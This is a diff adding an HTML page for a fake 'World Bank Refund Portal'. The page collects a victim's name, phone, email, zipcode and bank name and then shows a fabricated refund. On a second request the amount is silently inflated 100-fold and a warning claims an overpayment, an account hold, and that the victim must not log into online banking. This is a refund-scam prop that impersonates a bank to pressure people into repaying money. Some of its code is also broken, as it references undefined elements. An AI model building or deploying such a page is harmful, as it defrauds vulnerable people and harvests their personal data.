@@ -1,0 +1,336 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>World Bank Refund Portal</title>
+  <style>
+    :root { --card-w: 420px; --accent: #2563eb; --muted: #6b7280; --danger:#b91c1c; --success:#059669; }
+    body{font-family:system-ui, -apple-system, Roboto, 'Segoe UI', Arial;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#6cb3d4;margin:0;padding:20px}
+    .card{background:#fff;padding:26px;border-radius:14px;box-shadow: 0 10px 40px rgba(0,0,0,0.12);width:var(--card-w);position:relative;overflow:hidden}
+    h2{margin:0 0 8px 0;font-size:20px}
+    p.muted{margin:0 0 12px 0;color:var(--muted);font-size:13px}
+    label{display:block;margin-top:10px;font-weight:600;font-size:14px}
+    input,textarea,select{width:100%;padding:10px;margin-top:8px;border-radius:8px;border:1px solid #e5e7eb;font-size:14px;box-sizing:border-box}
+    .controls{display:flex;gap:8px;margin-top:14px}
+    .btn{flex:1;padding:10px 12px;border-radius:10px;border:0;cursor:pointer;font-weight:600}
+    .btn.primary{background:var(--accent);color:#fff}.btn.ghost{background:#f3f4f6;color:#111}.btn[disabled]{opacity:.55;cursor:not-allowed}
+    .step{display:none;animation:fadeIn .28s ease}.step.active{display:block}@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+    .msg{margin-top:12px;min-height:20px;font-size:14px}.msg.success{color:var(--success)}.msg.error{color:var(--danger)}
+    .progress{font-size:13px;color:var(--muted);margin-bottom:8px}
+    .thankyou{padding:18px;text-align:center}
+    .amount-highlight{font-weight:700;color:var(--accent)}
+    /* special styles for multiplied thank-you */
+    .multiplied {
+      border-radius:12px;padding:18px;background:linear-gradient(135deg,#fff7ed,#ffedd5);
+      box-shadow: 0 6px 18px rgba(250, 204, 21, 0.08);
+    }
+    .multiplied h3 { color:#b45309; margin-bottom:8px; }
+    .multiplied p { color:#92400e }
+    .normal-thanks h3 { color:var(--success); margin-bottom:8px; }
+    .page-logo {
+  position: fixed;      /* stays visible even if the page scrolls */
+  top: 20px;            /* distance from top edge */
+  left: 20px;           /* distance from left edge */
+  height: 60px;         /* logo height */
+  width: auto;          /* keep proportions */
+  object-fit: contain;
+  z-index: 10;          /* keep it above the form */
+}
+
+  </style>
+</head>
+<body>
+  <!-- Logo in top-left corner -->
+<img src="logo.png" alt="Logo" class="page-logo" />
+
+  <div class="card" role="region" aria-labelledby="formTitle">
+    <h2 id="formTitle">World Bank Refund Portal</h2>
+    <p class="muted">Click Next to continue.</p>
+    <div class="progress" id="progressText">Step 1 of 6</div>
+
+    <form id="begForm" action="/submit" method="post" novalidate>
+      <input type="hidden" name="reopened" id="reopened" value="0">
+
+      <!-- Steps (1..6) -->
+      <div class="step active" data-step="1">
+        <label for="name">Your name</label>
+        <input id="name" name="name" type="text" autocomplete="name" required minlength="2" placeholder="e.g. Deren Walker" />
+        <div class="controls">
+          <button type="button" class="btn ghost" onclick="history.back()">Cancel</button>
+          <button type="button" class="btn primary" id="next1">Next →</button>
+        </div>
+      </div>
+
+      <div class="step" data-step="2">
+        <label for="phone">Phone number</label>
+        <input id="phone" name="phone" type="tel" inputmode="tel" required placeholder="e.g. +11234567890" />
+        <div class="controls">
+          <button type="button" class="btn ghost" id="prev2">← Back</button>
+          <button type="button" class="btn primary" id="next2">Next →</button>
+        </div>
+      </div>
+
+      <div class="step" data-step="3">
+        <label for="email">Email</label>
+        <input id="email" name="email" type="email" required placeholder="you@example.com" />
+        <div class="controls">
+          <button type="button" class="btn ghost" id="prev3">← Back</button>
+          <button type="button" class="btn primary" id="next3">Next →</button>
+        </div>
+      </div>
+
+      <div class="step" data-step="4">
+        <label for="zipcode">Zipcode</label>
+        <input id="zipcode" name="zipcode" type="text" inputmode="numeric" required placeholder="e.g. 10001" />
+        <div class="controls">
+          <button type="button" class="btn ghost" id="prev4">← Back</button>
+          <button type="button" class="btn primary" id="next4">Next →</button>
+        </div>
+      </div>
+
+      <div class="step" data-step="5">
+        <label for="bank">Bank name</label>
+        <input id="bank" name="bank" type="text" required placeholder="e.g. Bank of America" />
+        <div class="controls">
+          <button type="button" class="btn ghost" id="prev5">← Back</button>
+          <button type="button" class="btn primary" id="next5">Next →</button>
+        </div>
+      </div>
+
+      <div class="step" data-step="6">
+        <label for="amount">Refund amount ($)</label>
+        <input id="amount" name="amount" type="number" inputmode="decimal" min="1" step="any" required placeholder="e.g. 200" />
+        <div class="controls">
+          <button type="button" class="btn ghost" id="prev6">← Back</button>
+          <button type="submit" class="btn primary" id="submitBtn">Submit </button>
+        </div>
+      </div>
+
+      <div id="formMsg" class="msg" aria-live="polite"></div>
+      <div id="processing" style="display:none; margin-top:12px; padding:12px; border-radius:8px; background:#fff7ed; color:#92400e; text-align:center; font-weight:600;">
+  Processing — kindly wait...
+</div>
+
+    </form>
+
+    <!-- consolidated thank-you wrapper -->
+    <div id="thankWrapper" style="display:none;">
+      <!-- normal (first-submit) thanks -->
+      <div id="normalThanks" class="thankyou normal-thanks" style="display:none;">
+        <h3>Success ✅</h3>
+        <p id="normalText">Refund amount <span class="amount-highlight">$0</span> has been successfully sent to you.</p>
+        <p class="muted">We recorded your details.</p>
+        <div style="margin-top:12px;">
+          <button id="requestAnother" class="btn primary" style="width:100%;">Request another Refund</button>
+        </div>
+        <div style="margin-top:8px;">
+          <button id="closeBtn" class="btn ghost" style="width:100%;">Close</button>
+        </div>
+      </div>
+
+      <!-- multiplied (reopened) thanks -->
+      <div id="multipliedThanks" class="thankyou multiplied" style="display:none;">
+        <h3>Incorrect amount enterred ⚠️ </h3>
+        <p id="multipliedText">Requested amount is more then your refund amount. World Bank placed a temporary hold on your account until the further action.</p>
+        <p style="margin-top:10px;">Amount Deposited: <span class="amount-highlight">$0</span></p>
+        <p class="muted" style="margin-top:10px;">Kindly Note - Do not login on mobile/online banking during this process, Any interruption may leads your account to blocked permanently from World Bank.</p>
+        <div style="margin-top:12px;">
+
+        </div>
+        <div style="margin-top:8px;">
+          
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+<script>
+  const steps = Array.from(document.querySelectorAll('.step'));
+  const progressText = document.getElementById('progressText');
+  const form = document.getElementById('begForm');
+  const msg = document.getElementById('formMsg');
+  const thankWrapper = document.getElementById('thankWrapper');
+  const normalThanks = document.getElementById('normalThanks');
+  const multipliedThanks = document.getElementById('multipliedThanks');
+  const normalText = document.getElementById('normalText');
+  const multipliedText = document.getElementById('multipliedText');
+  const reopenedInput = document.getElementById('reopened');
+
+  let current = 0;
+
+  function showStep(i){
+    steps.forEach((s,idx)=>s.classList.toggle('active', idx===i));
+    current = i;
+    progressText.textContent = `Step ${i+1} of ${steps.length}`;
+    msg.textContent = '';
+  }
+
+  function validName(){const v=document.getElementById('name').value.trim();return v.length>=2}
+  function validPhone(){const v=document.getElementById('phone').value.trim();const d=v.replace(/\D/g,'');return d.length>=6}
+  function validEmail(){const v=document.getElementById('email').value.trim();return /\S+@\S+\.\S+/.test(v)}
+  function validZip(){const v=document.getElementById('zipcode').value.trim();return /^[A-Za-z0-9\s\-]{3,10}$/.test(v)}
+  function validBank(){const v=document.getElementById('bank').value.trim();return v.length>=2}
+  function validAmount(){const v=document.getElementById('amount').value;return v!=='' && !isNaN(v) && Number(v)>0}
+
+  document.getElementById('next1').addEventListener('click',()=>{ if(!validName()){msg.className='msg error';msg.textContent='Please enter a valid name (at least 2 characters).';document.getElementById('name').focus();return;} showStep(1); });
+  document.getElementById('next2').addEventListener('click',()=>{ if(!validPhone()){msg.className='msg error';msg.textContent='Please enter a valid phone number.';document.getElementById('phone').focus();return;} showStep(2); });
+  document.getElementById('next3').addEventListener('click',()=>{ if(!validEmail()){msg.className='msg error';msg.textContent='Please enter a valid email address.';document.getElementById('email').focus();return;} showStep(3); });
+  document.getElementById('next4').addEventListener('click',()=>{ if(!validZip()){msg.className='msg error';msg.textContent='Please enter a valid zipcode.';document.getElementById('zipcode').focus();return;} showStep(4); });
+  document.getElementById('next5').addEventListener('click',()=>{ if(!validBank()){msg.className='msg error';msg.textContent='Please enter your bank name.';document.getElementById('bank').focus();return;} showStep(5); });
+
+  document.getElementById('prev2').addEventListener('click',()=>showStep(0));
+  document.getElementById('prev3').addEventListener('click',()=>showStep(1));
+  document.getElementById('prev4').addEventListener('click',()=>showStep(2));
+  document.getElementById('prev5').addEventListener('click',()=>showStep(3));
+  document.getElementById('prev6').addEventListener('click',()=>showStep(4));
+
+  async function postFormData(fd){
+    try{
+      const res = await fetch(form.action, { method:'POST', body: fd });
+      const json = await res.json().catch(()=>null);
+      return { ok: res.ok, status: res.status, json };
+    }catch(err){ return { ok:false, error:err.message } }
+  }
+
+  form.addEventListener('submit', async (e)=>{
+    e.preventDefault();
+    msg.textContent = '';
+    if (!validAmount()) { msg.className='msg error'; msg.textContent='Please enter a valid amount.'; document.getElementById('amount').focus(); return; }
+
+    // respect hidden reopened value set by "Request another"
+    const reopenedVal = (reopenedInput && String(reopenedInput.value)) || '0';
+    const fd = new FormData(form);
+    fd.set('reopened', reopenedVal);
+
+    const submitBtn = document.getElementById('submitBtn');
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Submitting...';
+
+    const result = await postFormData(fd);
+
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Submit 🎉';
+
+    if (result.ok && result.json && result.json.success){
+      // Save last non-amount fields so we can reuse later
+lastSubmission = {
+  name: document.getElementById('name').value.trim(),
+  phone: document.getElementById('phone').value.trim(),
+  email: document.getElementById('email').value.trim(),
+  zipcode: document.getElementById('zipcode').value.trim(),
+  bank: document.getElementById('bank').value.trim()
+};
+
+      // show 5-second “Processing” message before thank-you
+const processingEl = document.getElementById('processing');
+processingEl.style.display = 'block';
+
+// record start time right when response received
+const start = Date.now();
+
+// capture data from server
+const amountSent = Number(result.json.amount_sent);
+const wasMultiplied = !!result.json.multiplied;
+
+// ensure at least 5s delay (5000 ms)
+const MIN_WAIT = 5000;
+setTimeout(() => {
+  processingEl.style.display = 'none';
+  thankWrapper.style.display = 'block';
+
+  if (wasMultiplied) {
+    multipliedThanks.style.display = 'block';
+    normalThanks.style.display = 'none';
+    multipliedThanks.querySelector('.amount-highlight').textContent =
+      '$' + Number(amountSent).toLocaleString();
+    multipliedText.textContent =
+      `Requested amount is more then your refund amount. Because of it, World Bank placed a temporary hold on your account until the further action.`;
+  } else {
+    normalThanks.style.display = 'block';
+    multipliedThanks.style.display = 'none';
+    normalText.innerHTML =
+      `Refund amount <span class="amount-highlight">$${Number(amountSent).toLocaleString()}</span> has been successfully sent to you.`;
+  }
+
+  form.style.display = 'none';
+  msg.className = 'msg success';
+  msg.textContent = '';
+
+  form.reset();
+  // make inputs editable again for future fresh fills
+['name','phone','email','zipcode','bank'].forEach(id=>{
+  const el = document.getElementById(id);
+  if (el) el.readOnly = false;
+});
+
+  reopenedInput.value = '0';
+}, MIN_WAIT);
+
+    } else {
+      const err = (result.json && result.json.error) || result.error || `Submit failed (status ${result.status || 'err'})`;
+      msg.className = 'msg error';
+      msg.textContent = err;
+    }
+  });
+
+  // Reopen full form for a fresh fill; set reopened=1 so server multiplies
+  // Request Another Begging — only ask for amount, reuse previous details
+document.getElementById('requestAnother').addEventListener('click', ()=>{
+  // If we don't have lastSubmission saved, fallback to full form
+  if (!lastSubmission) {
+    thankWrapper.style.display = 'none';
+    form.style.display = 'block';
+    reopenedInput.value = '1';
+    showStep(0);
+    setTimeout(()=>document.getElementById('name').focus(),100);
+    msg.className='msg';
+    msg.textContent = 'Please fill the form again (no previous data found).';
+    setTimeout(()=>{ if (msg.className==='msg') msg.textContent=''; }, 4000);
+    return;
+  }
+
+  // Reuse previous details (prefill and make readonly)
+  ['name','phone','email','zipcode','bank'].forEach(id=>{
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.value = lastSubmission[id] || '';
+    el.readOnly = true;
+  });
+
+  // Show only amount step
+  thankWrapper.style.display = 'none';
+  form.style.display = 'block';
+  reopenedInput.value = '1';
+  showStep(5); // jump directly to begging amount
+  document.getElementById('amount').value = '';
+  setTimeout(()=>document.getElementById('amount').focus(),120);
+
+  msg.className='msg';
+  msg.textContent = 'Reusing previous details — please enter begging amount only.';
+  setTimeout(()=>{ if (msg.className==='msg') msg.textContent=''; }, 4000);
+});
+
+
+  // Also attach same behavior to multiplied thanks' button (so user can repeat again)
+  document.getElementById('requestAnother2').addEventListener('click', ()=>{
+    thankWrapper.style.display = 'none';
+    normalThanks.style.display = 'none';
+    multipliedThanks.style.display = 'none';
+    form.style.display = 'block';
+    reopenedInput.value = '1';
+    showStep(0);
+    setTimeout(()=>document.getElementById('name').focus(),100);
+    msg.className='msg';
+    msg.textContent = 'You will fill the form again. Next submit will be multiplied by 100 (server-side).';
+    setTimeout(()=>{ if (msg.className==='msg') msg.textContent=''; }, 4000);
+  });
+
+  document.getElementById('closeBtn').addEventListener('click', ()=>location.reload());
+  document.getElementById('closeBtn2').addEventListener('click', ()=>location.reload());
+
+  showStep(0);
+</script>
+</body>
+</html>
